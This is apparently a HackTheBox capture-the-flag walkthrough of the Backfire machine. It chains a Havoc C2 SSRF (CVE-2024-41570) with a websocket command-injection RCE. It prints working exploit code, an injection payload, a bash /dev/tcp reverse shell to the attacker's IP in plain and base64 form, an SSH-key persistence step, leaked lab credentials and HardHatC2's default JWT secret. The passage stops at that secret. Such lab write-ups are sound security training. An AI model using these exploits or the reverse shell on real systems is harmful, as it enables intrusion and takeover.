---
title: HTB: Backfire
url: https://0xdf.gitlab.io/2025/06/07/htb-backfire.html
date: 2025-06-07T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-backfire, nmap, debian, havoc, cve-2024-41570, ssrf, ssrf-websocket, chat-gpt, hardhatc2, docker, jwt, jwt-default-secret, iptables, iptables-save, arbitrary-write
---

![Backfire](/img/backfire-cover.png)

Backfire is all about exploiting red team infrastructure, first Havoc, and then HardHatC2. I’ll start with a Havoc server and leak the configuration from the website. I’ll exploit an SSRF vulnerability to get access to the admin port internally. There’s an authenticated RCE vulnerability on this port, but it involves sending payloads into a websocket. I’ll create a chained exploit using the SSRF to stand up and communicate over a websocket to get command injection and a shell. From here, I’ll find an instance of HardHatC2, and exploit the default JWT secret to forge cookies and get access. Inside the C2 admin panel, I’ll get a shell as the next user. Finally, I’ll abuse a sudo rule that allows saving the firewall rules to get arbitrary write, and get a shell as root.

## Box Info

| Name | [Backfire](https://hackthebox.com/machines/backfire)  [Backfire](https://hackthebox.com/machines/backfire) [Play on HackTheBox](https://hackthebox.com/machines/backfire) |
| --- | --- |
| Release Date | [18 Jan 2025](https://twitter.com/hackthebox_eu/status/1879936684332060734) |
| Retire Date | 07 Jun 2025 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Backfire |
| Radar Graph | Radar chart for Backfire |
| First Blood User | 01:14:50[fisstech fisstech](https://app.hackthebox.com/users/848478) |
| First Blood Root | 02:35:22[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creators | [hyperreality hyperreality](https://app.hackthebox.com/users/49704)  [chebuya chebuya](https://app.hackthebox.com/users/1688469) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTPS (443) and HTTP (8000), as well as two filtered ports (5000 and 7096):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.49
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 13:29 EST
Nmap scan report for 10.10.11.49
Host is up (0.089s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
443/tcp  open     https
5000/tcp filtered upnp
7096/tcp filtered unknown
8000/tcp open     http-alt

Nmap done: 1 IP address (1 host up) scanned in 6.89 seconds
oxdf@hacky$ nmap -p 22,443,8000 -sCV 10.10.11.49
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 13:30 EST
Nmap scan report for 10.10.11.49
Host is up (0.085s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
|_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
443/tcp  open  ssl/http nginx 1.22.1
| ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Illinois/countryName=US
| Subject Alternative Name: IP Address:127.0.0.1
| Not valid before: 2024-07-16T17:28:10
|_Not valid after:  2027-07-16T17:28:10
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.22.1
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: 404 Not Found
8000/tcp open  http     nginx 1.22.1
|_http-title: Index of /
|_http-server-header: nginx/1.22.1
|_http-open-proxy: Proxy might be redirecting requests
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 11:31  disable_tls.patch
| 875   17-Dec-2024 11:34  havoc.yaotl
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds

```

Based on the [OpenSSH and nginx versions](/cheatsheets/os#debian), the host is likely running Debian 12 bookworm. There’s no sign of host-based routing or any kind of domain name, so I’ll proceed by targeting the IP.

### Website - TCP 443

#### Site

Visiting `https://10.10.11.49/` returns the [default nginx 404](/cheatsheets/404#nginx):

![image-20250124133226450](/img/image-20250124133226450.png)

#### Tech Stack

The HTTP response headers show an interesting header besides the `Server`:

```

HTTP/1.1 404 Not Found
Server: nginx/1.22.1
Date: Fri, 24 Jan 2025 18:33:17 GMT
Content-Type: text/html
Connection: keep-alive
X-Havoc: true
Content-Length: 146

```

Searching in [grep.app](https://grep.app/search?q=x-havoc) for `X-Havoc` shows a pretty solid match on Havoc:

![image-20250124133509255](/img/image-20250124133509255.png)

[Havoc](https://github.com/HavocFramework/Havoc) is a Go-based post-exploitation C2 framework.

Brute forcing directories with `feroxbuster` doesn’t find anything interesting.

### HTTP - TCP 8000

The site on port 8000 is just a directory listing with two files:

![image-20250124133821473](/img/image-20250124133821473.png)

`disable_tls.patch` is a [patch file](https://en.wikipedia.org/wiki/Patch_(Unix)) for the websocket post in Havoc to not require TLS:

```

Disable TLS for Websocket management port 40056, so I can prove that
sergej is not doing any work
Management port only allows local connections (we use ssh forwarding) so 
this will not compromise our teamserver

diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
index abdf1b5..6be76fb 100644
--- a/client/src/Havoc/Connector.cc
+++ b/client/src/Havoc/Connector.cc
@@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
 {
     Teamserver   = ConnectionInfo;
     Socket       = new QWebSocket();
-    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
     auto SslConf = Socket->sslConfiguration();
 
     /* ignore annoying SSL errors */
     SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
-    Socket->setSslConfiguration( SslConf );
     Socket->ignoreSslErrors();
 
     QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const QByteArray& Message )
diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.go
index 9d1c21f..59d350d 100644
--- a/teamserver/cmd/server/teamserver.go
+++ b/teamserver/cmd/server/teamserver.go
@@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
 		}
 
 		// start the teamserver
-		if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+		if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
 			logger.Error("Failed to start websocket: " + err.Error())
 		}

```

There’s a note here about catching a coworker being lazy, but more importantly a hint to access the management port 40056 only on localhost.

The other file is a `.yaotl` file, which is the [configuration language used by Havoc](https://havocframework.com/docs/profiles):

```

Teamserver {
    Host = "127.0.0.1"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "ilya" {
        Password = "CobaltStr1keSuckz!"
    }

    user "sergej" {
        Password = "1w4nt2sw1tch2h4rdh4tc2"
    }
}

Demon {
    Sleep = 2
    Jitter = 15

    TrustXForwardedFor = false

    Injection {
        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
    }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = [
            "backfire.htb"
        ]
        HostBind = "127.0.0.1" 
        PortBind = 8443
        PortConn = 8443
        HostRotation = "round-robin"
        Secure = true
    }
}

```

There are a couple users and passwords in the file, as well as the domain `backfire.htb`, and several ports listening on localhost.

## Shell as ilya

### Strategy

The foothold expliotation path is a bit complex, so I’ll give an overview of it before going into the particulars. I’ll blur this section for anyone not wanting to spoil what’s coming.

Getting user involves chaining together two exploits in Havor, an unauthenticated server-side request forgery (SSRF), and an authenticated command injection remote code execution (RCE). The SSRF provides the authenticated access to the RCE vulnerability.

When Backfire released on HTB, there were POC scripts for both the SSRF and for the RCE exploits. The SSRF one works as is on Backfire, but the RCE exploit is designed to go directly to the target. The challenge in Backfire was to take the RCE script and figure out how to use the SSRF to send the same payloads to target.

Within days of Backfire's release, there were new POCs publicly available to chain these two exploits, but I'll skip those since they weren't available at the time I was originally solving the box, and it's a fun challenge to combine them, and show the challenge as it was on release day.

### SSRF

#### Identify CVE-2024-41570

Searching for “Havoc CVE” leads to CVE-2024-41570:

![image-20250124134532894](/img/image-20250124134532894.png)

#### Background

The [NVD page](https://nvd.nist.gov/vuln/detail/CVE-2024-41570) describes the vulnerability as:

> An Unauthenticated Server-Side Request Forgery (SSRF) in demon callback handling in Havoc 2 0.7 allows attackers to send arbitrary network traffic originating from the team server.

A [full writeup](https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/) is available from chebuya’s (one of the authors of Backfile) blog, and it goes into a ton of detail. I’ll give a higher level overview here.

In Havoc, the default malware / agent is called a demon. The actor on the Havoc server will create listeners (typically HTTP(S)), which the demon’s connect to.

When the demon connects to a listener, it accesses a command by a 32-bit int. For example, 99 is DEMON\_INITIALIZE, as seen in the [source here](https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/payloads/Demon/include/core/Command.h#L38), or in the POC exploit script [here](https://github.com/chebuya/Havoc-C2-SSRF-poc/blob/main/exploit.py#L58-L83) in the `register_agent` function:

```

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")

```

The vast majority of these commands are authenticated. Only if the listener issues a command to do something will it process the command from the demon in response. This is checked with the `IsKnownRequestID` [function](https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/agent/agent.go#L609-L629) in Havoc in the `TaskDispatch` [function](https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/agent/demons.go#L2290):

```

func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.Parser, teamserver TeamServer) {
	var NameID, _ = strconv.ParseInt(a.NameID, 16, 64)
	AgentID := int(NameID)

	/* if the RequestID was not generated by the TS, reject the request */
	if a.IsKnownRequestID(teamserver, RequestID, CommandID) == false {
		logger.Warn(fmt.Sprintf("Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity", AgentID, CommandID, RequestID))
		return
	}

	switch CommandID {
...[snip]...

```

However, at the top of `IsKnownRequestID`, there are a couple exceptions:

```

// check that the request the agent is valid
func (a *Agent) IsKnownRequestID(teamserver TeamServer, RequestID uint32, CommandID uint32) bool {
	// some commands are always accepted because they don't follow the "send task and get response" format
	switch CommandID {
	case COMMAND_SOCKET:
		return true
	case COMMAND_PIVOT:
		return true
	}
...[snip]...	

```

If the command is `COMMAND_SOCKET` or `COMMAND_PIVOT`, then this just returns true. This means that the demon can contact the C2 with one of these commands and it doesn’t matter that it never issued a request for it. The reason is that these are used for proxying data and creating tunnels.

With these commands, the researcher was able to generate a SSRF.

#### Run POC

The second link in the search above is a [POC on GitHub](https://github.com/chebuya/Havoc-C2-SSRF-poc), which is associated with the blog post. I’ll save a copy of the script. It doesn’t document what libraries are needed, but it turns out it’s `requests` and `pycryptodome`. I’ll add these with `uv` (check out the [uv cheatsheet](/cheatsheets/uv#) for details):

```

oxdf@hacky$ uv add --script exploit.py requests pycryptodome
Updated `exploit.py`
oxdf@hacky$ uv run --script exploit.py
Installed 6 packages in 8ms
usage: exploit.py [-h] -t TARGET -i IP -p PORT [-A USER_AGENT] [-H HOSTNAME] [-u USERNAME]
                  [-d DOMAIN_NAME] [-n PROCESS_NAME] [-ip INTERNAL_IP]
exploit.py: error: the following arguments are required: -t/--target, -i/--ip, -p/--port

```

I’ll give the script the target as well as a reference to the IP and port to make a request to (my HTB VPN IP):

```

oxdf@hacky$ uv run --script exploit.py -t https://10.10.11.49 -i 10.10.14.6 -p 80
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
[***] Success!
[***] Trying to poll teamserver for socket output...
[***] Read socket output successfully!
HTTP/1.0 404 File not found
Server: SimpleHTTP/0.6 Python/3.12.3
Date: Fri, 24 Jan 2025 18:51:43 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 335

<!DOCTYPE HTML>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: 404 - Nothing matches the given URI.</p>
    </body>
</html>

```

On my Python webserver, there’s a request for `/vulnerable`, which returns the 404 response shown above:

```

oxdf@hacky$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.49 - - [24/Jan/2025 13:51:43] code 404, message File not found
10.10.11.49 - - [24/Jan/2025 13:51:43] "GET /vulnerable HTTP/1.1" 404 -

```

#### Enumerating

With this SSRF, I’ll try to read the management port mentioned above:

```

oxdf@hacky$ uv run --script exploit.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056
...[snip]...
HTTP/1.1 404 Not Found
Content-Type: text/plain
Date: Fri, 24 Jan 2025 18:59:07 GMT
Content-Length: 18
Connection: close

404 page not found

```

The two filtered ports, 5000 and 7096, both return empty responses.

### Authenticated RCE

#### Identify

A bit more searching leads to a post from Include Security, [Vulnerabilities in Open Source C2 Frameworks](https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/). It’s a bit of an overview style, without going into a ton of detail. But in the section on Havoc, there’s mention of an authenticated RCE exploit:

> Havoc has an authenticated RCE vulnerability in the teamserver that is similar to the one in Sliver. Further, the [default Havoc configuration](https://github.com/HavocFramework/Havoc/blob/main/profiles/havoc.yaotl#L12) creates two users with the password “password1234”, so anyone careless enough to run Havoc with default settings on an untrusted network can immediately be exploited by this RCE vulnerability. Teamservers that are firewalled off can still be hit due to a cool [SSRF vulnerability](https://blog.chebuya.com/posts/server-side-request-forgery-on-havoc-c2/) discovered by chebuya recently.

The description even mentions the SSRF exploit I’ve already exploited! There’s more detail:

> An injection payload into the service name field looks something like `\" -mbla; CMD 1>&2 && false #`:
>
> - `\"` to exit out the quotes
> - `-mbla` to cause the MinGW compilation to fail and not have to wait for it
> - `CMD 1>&2` with the chosen payload redirected to stderr
> - `&& false` to cause the command to fail and the server to send back the stderr output
> - `#` to comment out the parameters after our injection

There’s a [POC script](https://github.com/IncludeSecurity/c2-vulnerabilities/blob/main/havoc_auth_rce/havoc_rce.py) as well.

The vulnerability is in the code that handles building binaries to deploy to demons. The `builder.go` [file](https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/common/builder/builder.go#L78) is entirely devoted to generating the correct command line string necessary to compile something, eventually passed to `exec` in the `Cmd` [function](https://github.com/HavocFramework/Havoc/blob/41a5d45c2b843d19be581a94350c532c1cd7fd49/teamserver/pkg/common/builder/builder.go#L1064-L1088):

```

func (b *Builder) Cmd(cmd string) bool {
	var (
		Command = exec.Command("sh", "-c", cmd)
		stdout  bytes.Buffer
		stderr  bytes.Buffer
		err     error
	)

	Command.Dir = b.sourcePath
	Command.Stdout = &stdout
	Command.Stderr = &stderr

	err = Command.Run()
	if err != nil {
		logger.Error("Couldn't compile implant: " + err.Error())
		if !b.silent {
			b.SendConsoleMessage("Error", "couldn't compile implant: "+err.Error())
			b.SendConsoleMessage("Error", "compile output: "+stderr.String())
		}
		logger.Debug(cmd)
		logger.Debug("StdErr:\n" + stderr.String())
		return false
	}
	return true
}

```

Because it’s just joining a bunch of strings, we have an opportunity for command injection. Many of the parameters are sanitized, but the service name parameter is not.

To exploit this, I’ll need to connect to the admin websocket, which is blocked by the firewall. I’ll have to use the SSRF above to generate that traffic.

#### Breakdown

The RCE POC Python script creates a web socket and then sends three requests into it. The creation looks like:

```

ws = create_connection(f"wss://{HOSTNAME}:{PORT}/havoc/",
                       sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False})

```

The first websocket message is to authenticate:

```

payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": USER}}
ws.send(json.dumps(payload))
print(json.loads(ws.recv()))

```

The second will create a listener to build an agent for:

```

payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": USER}}
ws.send(json.dumps(payload))

```

The third one is to run the injection:

```

cmd = input("$ ")
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""

# Command injection in demon compilation command
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
    "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
ws.send(json.dumps(payload))

```

There is code in the POC to process the results and print it, but I’m going to focus on getting RCE.

### Create Exploit

#### Strategy

If I can set up this websocket connection over the SSRF and send three messages into it, I should get RCE. I’ll need to generate two functions. One to generate the HTTP GET request to initiate the websocket connection, and then one to generate messages to the websocket.

I’ll make a copy of the SSRF POC and remove the last three lines where it sends a request to `/vulnerable` on the given host:

```

request_data = b"GET /vulnerable HTTP/1.1\r\nHost: www.example.com\r\nConnection: close\r\n\r\n"
write_socket(socket_id, request_data)
print(read_socket(socket_id).decode())

```

#### Initiate Websocket

ChatGPT is actually pretty good at giving me what I need here:

![image-20250124150846210](/img/image-20250124150846210.png)

My function looks like:

```

def create_websocket_init_req(host, port, path):
    websocket_key = base64.b64encode(b"randombytes12345").decode("utf-8")
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {websocket_key}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    ).encode()
    return request

```

And I’ll use this to initiate the websocket at the end of the exploit:

```

init_ws_request = create_websocket_init_req(hostname, args.port, '/havoc/')
write_socket(socket_id, init_ws_request)

```

#### Generate Frame

Now I need to send messages or frames into the socket. ChatGPT is really nice here, helping me to generate this function:

```

def create_websocket_frame(message):
    payload = message.encode("utf-8")
    payload_length = len(payload)
    first_byte = 0b10000001  # Binary: FIN = 1, Opcode = 1

    if payload_length <= 125:
        second_byte = 0b10000000 | payload_length
        frame = struct.pack("!BB", first_byte, second_byte)
    elif payload_length <= 65535:
        second_byte = 0b10000000 | 126
        frame = struct.pack("!BBH", first_byte, second_byte, payload_length)
    else:
        second_byte = 0b10000000 | 127
        frame = struct.pack("!BBQ", first_byte, second_byte, payload_length)

    masking_key = random.randbytes(4)
    frame += masking_key
    masked_payload = bytearray(payload[i] ^ masking_key[i % 4] for i in range(payload_length))
    frame += masked_payload

    return frame

```

#### Sending Messages

The first message is the authentication message. I’ll add a couple of arguments to the script to read in the username, password, and command:

```

parser.add_argument("-U", "--admin-username", help="Username for admin auth", required=True)
parser.add_argument("-P", "--password", help="Password for admin auth", required=True)
parser.add_argument('-c', '--cmd', help="Command to run", required=True)

```

I’ll copy the payload from the RCE POC and pass it to the function to generate websocket frames:

```

# auth
payload = {"Body": {"Info": {"Password": hashlib.sha3_256(args.password.encode()).hexdigest(), "User": args.admin_username}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:40:17", "User": args.admin_username}}
message = create_websocket_frame(json.dumps(payload))
write_socket(socket_id, message)

```

The next frame is creating some kind of listener. I’ll only need to update the variable name holding the username at the end:

```

# listener
payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRotation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443","Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":"","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":"","Time":"08:39:18","User": args.admin_username}}
message = create_websocket_frame(json.dumps(payload))
write_socket(socket_id, message)

```

Finally, the command injection message. I’ll use the code from the POC again, updating it to take `args.cmd`:

```

# injection
injection = """ \\\\\\\" -mbla; """ + args.cmd + """ 1>&2 && false #"""
payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n        \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \"Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",\n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\": \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Windows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
    "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": args.admin_username}}
message = create_websocket_frame(json.dumps(payload))
write_socket(socket_id, message)

```

#### Execution

I’ll run this with a simple `ping` command to see if it works, using the creds from the [config above](/2025/06/07/htb-backfire.html#http---tcp-8000):

```

oxdf@hacky$ uv add --script rce.py requests pycryptodome
Updated `rce.py`
oxdf@hacky$ uv run --script rce.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P 'CobaltStr1keSuckz!' -c 'ping -c 1 10.10.14.6'
Installed 6 packages in 9ms
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
[***] Trying to write to the socket
...[snip]...

```

At `tcpdump`, there’s ICMP:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:45:42.762075 IP 10.10.11.49 > 10.10.14.6: ICMP echo request, id 6302, seq 1, length 64
15:45:42.762109 IP 10.10.14.6 > 10.10.11.49: ICMP echo reply, id 6302, seq 1, length 64

```

That’s RCE!

#### Shell

I’ll try `-c 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'`, but it doesn’t work. That’s not surprising, given the amount of times the data is processed and passed on and the special characters. I’ll base64 encode that payload:

```

oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo=
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK

```

Any of these would probably work, but I like to add spaces to get rid of special characters.

Now I’ll send this as the payload:

```

oxdf@hacky$ uv run rce.py -t https://10.10.11.49 -i 127.0.0.1 -p 40056 -U ilya -P 'CobaltStr1keSuckz!' -c 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK | base64 -d | bash'
...[snip]...

```

It works:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.49 40244
bash: cannot set terminal process group (6324): Inappropriate ioctl for device
bash: no job control in this shell
ilya@backfire:~/Havoc/payloads/Demon$

```

I can grab `user.txt`:

```

ilya@backfire:~$ cat user.txt
886b281d************************

```

#### SSH

The shell is a bit flaky, dying sometimes without warning. I’ll add an SSH key to `/home/ilya/.ssh/authorized_keys`:

```

ilya@backfire:~$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> .ssh/authorized_keys

```

And now connect using SSH:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen ilya@10.10.11.49
Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64
ilya@backfire:~$ 

```

## Shell as sergej

### Enumeration

#### Home Directories

In ilya’s home directory there are a few files besides `user.txt`:

```

ilya@backfire:~$ ls 
files  hardhat.txt  Havoc  user.txt

```

`files` has the same files as what’s hosted on the port 8000 webserver. `Havoc` is the installation of Havoc. `hardhat.txt` says:

> Sergej said he installed HardHatC2 for testing and not made any changes to the defaults
> I hope he prefers Havoc bcoz I don’t wanna learn another C2 framework, also Go > C#

There is a `sergej` directory in `/home`:

```

ilya@backfire:/home$ ls
ilya  sergej

```

ilya doesn’t have access. These users match the users with shells in `/etc/passwd`:

```

ilya@backfire:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ilya:x:1000:1000:ilya,,,:/home/ilya:/bin/bash
sergej:x:1001:1001:,,,:/home/sergej:/bin/bash

```

#### Network

There are many listening ports:

```

ilya@backfire:/$ netstat -tnl
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:7096            0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:40056         0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN 

```
- 8000 is the webserver serving files from `/var/www/files` (as can be seen in `/etc/nginx/conf.d/tcp_8000.conf`)
- 8443 is where Havoc is actually listening, and nginx is forwarding it from 443 (as can be seen in `/etc/nginx/conf.d/havoc.conf`).
- 5000 and 7096 were filtered from the outside, so I’ll want to look at these.
- 443 is the outward-facing Havoc server.
- 22 is SSH
- 40056 is the Havoc management port.

#### Processes

The most interesting processes at this point belong to sergej, who is running Hardhat:

```

ilya@backfire:/$ ps auxww | grep sergej
sergej      6921  3.0  6.5 274271224 259772 ?    Ssl  16:00   0:12 /home/sergej/.dotnet/dotnet run --project HardHatC2Client --configuration Release
sergej      6922  2.6  6.4 274262820 258032 ?    Ssl  16:00   0:11 /home/sergej/.dotnet/dotnet run --project TeamServer --configuration Release
sergej      6979  2.1  3.3 274203412 131524 ?    Sl   16:00   0:08 /home/sergej/HardHatC2/TeamServer/bin/Release/net7.0/TeamServer
sergej      6992  1.2  3.2 274195036 131112 ?    Sl   16:00   0:05 /home/sergej/HardHatC2/HardHatC2Client/bin/Release/net7.0/HardHatC2Client

```

### Hardhat

#### Local

[Hardhat C2](https://github.com/DragoQCC/HardHatC2) is an open source C# C2 framework. The note from ilya says that sergej didn’t change anything. The default config file is located [here](https://github.com/DragoQCC/HardHatC2/blob/74a86e6680309c7e192826a7ceff6642501e81a7/TeamServer/appsettings.json):

```

{
  "Logging": {
    "LogLevel": {
      "Default": "Information",
      "Microsoft": "Warning",
      "Microsoft.Hosting.Lifetime": "Information"
    }
  },
  "AllowedHosts": "*",
  "Jwt": {
    "Key": "jtee43gt-6543-2iur-9422-83r5w27hgzaq",
    "Issuer": "hardhatc2.com"
  },
  "IPWhitelistOptions": {
    "Whitelist": [ "*"]
  },
}

```

